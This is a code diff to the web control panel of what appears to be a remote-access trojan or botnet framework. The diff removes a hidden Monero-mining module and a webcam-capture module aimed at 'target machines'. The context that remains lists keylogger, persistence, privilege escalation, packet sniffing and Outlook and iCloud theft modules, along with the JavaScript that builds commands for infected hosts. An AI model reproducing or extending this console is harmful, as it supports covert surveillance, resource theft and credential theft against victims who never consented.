@@ -39,13 +39,11 @@
 								<div class="form-group" align="left">
 									<select required class="selectboxit" data-first-option="false" id="module" name="module" style="overflow: visible;">
 										<option>Select module</option>
-										<option value="miner">Miner</option>
 										<option value="persistence">Persistence</option>
 										<option value="keylogger">Keylogger</option>
 										<option value="escalate">Escalate Privileges</option>
 										<option value="packetsniffer">Packet Sniffer</option>
 										<option value="screenshot">Screenshot</option>
-										<option value="webcam">Webcam</option>
 										<option value="outlook">Outlook Emails</option>
 										<option value="icloud">iCloud</option>
 										<option value="portscanner">Port Scanner</option>
@@ -69,43 +67,6 @@
 								 	</ul>
 
 									<div id="module-platforms"></div>
-
-									<!-- Miner  Options -->
-									<div class="input-group" name="miner" id="miner">
-
-										<div class="radio radio-replace" style="padding: 5px">
-											<input type="radio" id="miner-rd-run" name="radio1" onclick="updateModule();">
-											<label>Run</label>
-										</div>
-										
-										<div class="radio radio-replace" style="padding: 5px">
-											<input type="radio" id="miner-rd-stop" name="radio1" onclick="updateModule();">
-											<label>Stop</label>
-										</div>
-
-									  	<input class="form-control" name="miner-url" id="miner-url" placeholder="URL" type="text" required></input>
-
-									  	<input class="form-control" name="miner-port" id="miner-port" placeholder="Port" type="text" required></input>
-
-									  	<input class="form-control" name="miner-username" id="miner-username" placeholder="Wallet Address" type="text" required></input>
-
-									</div>
-
-
-									<!-- Webcam Options -->
-									<div class="input-group" name="webcam" id="webcam">
-										<div class="radio radio-replace" style="padding: 5px">
-											<input type="radio" id="rd-img" name="radio1" checked>
-											<label>Image</label>
-										</div>
-										
-										<div class="radio radio-replace" style="padding: 5px">
-											<input type="radio" id="rd-vid" name="radio1">
-											<label>Video</label>
-										</div>
-									</div>
-
-
 
 									<!-- Keylogger options -->
 									<div class="input-group" name="keylogger" id="keylogger">
@@ -618,65 +579,6 @@
 
 			// Modules with options panel
 
-			// miner
-			if (val === "miner") {
-
-				// open/close miner panel options
-				$('#miner-label').show();
-				$('#miner').show();
-
-				if ($('#miner-rd-run').is(':checked')) {
-					$('#miner-url').show();
-					$('#miner-port').show();
-					$('#miner-username').show();		
-				}
-
-				if ($('#miner-rd-stop').is(':checked')) {
-					$('#miner-url').hide();
-					$('#miner-port').hide();
-					$('#miner-username').hide();
-				}
-
-				// add module name/info
-				$('#module-name').html('Miner');
-				$('#module-platforms').html(`
-					<strong>Platforms: </strong>
-					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
-					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
-					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
-				$('#module-description').html(`<p>Run Monero miner in the background of the target machines.</p>`);
-				$('#module-info').html(`
-					<li><strong>URL</strong> URL of mining server</li>
-					<li><strong>Port</strong> Port of mining server</li>
-					<li><strong>Wallet Address</strong> Monero wallet address</li>`);
-
-			} else {
-				$('#miner-label').hide();
-				$('#miner').hide();
-			}
-
-			// webcam
-			if (val === "webcam") {
-				$('#webcam-label').show();
-				$('#webcam').show();
-
-				// add module name/info
-				$('#module-name').html('Webcam');
-				$('#module-platforms').html(`
-					<strong>Platforms: </strong>
-					<img src="/assets/images/os/win32.png" width="30" height="30" style="padding: 2px">
-					<img src="/assets/images/os/linux2.png" width="30" height="30" style="padding: 2px">
-					<img src="/assets/images/os/darwin.png" width="30" height="30" style="padding: 2px">`);
-				$('#module-description').html(`<p>Capture images/videos from the target's webcam.</p>`);
-				$('#module-info').html(`
-					<li><strong>Image</strong> Capture an image (PNG)</li>
-					<li><strong>Video</strong> Capture a video (AVI)</li>`);
-
-			} else {
-				$('#webcam-label').hide();
-				$('#webcam').hide();
-			}
-
 			// keylogger
 			if (val === "keylogger") {
 				$('#keylogger-label').show();
@@ -812,23 +714,8 @@
 			var params = '';
 
 			// construct command
-			if (action === 'miner') {
-				if ($('#miner-rd-run').is(':checked')) {
-					var miner_url = $('#miner-url').selectBoxIt().val();
-					var miner_port = $('#miner-port').selectBoxIt().val();
-					var miner_username = $('#miner-username').selectBoxIt().val();
-					params += 'run ' + miner_url + ' ' + miner_port + ' ' + miner_username;
-				} else if ($('#miner-rd-stop').is(':checked')) {
-					params += 'stop';
-				}
-			} else if (action === 'persistence') {
+			if (action === 'persistence') {
 				params += 'add all';
-			} else if (action === 'webcam') {
-				if ($('#rd-img').is(':checked')) {
-					params += 'image';
-				} else if ($('#rd-vid').is(':checked')) {
-					params += 'video';
-				}
 			} else if (action === 'keylogger' || action == 'packetsniffer') {
 				if ($('#' + action + '-rd-run').is(':checked')) {
 					params += 'run';
@@ -906,14 +793,6 @@
 
 	<script>
 		$(document).ready(function(){
-			// hide miner options
-			$('#miner-label').hide();
-			$('#miner').hide();
-
-			// hide webcam options
-			$('#webcam-label').hide();
-			$('#webcam').hide();
-
 			// hide keylogger options
 			$('#keylogger-label').hide();
 			$('#keylogger').hide();
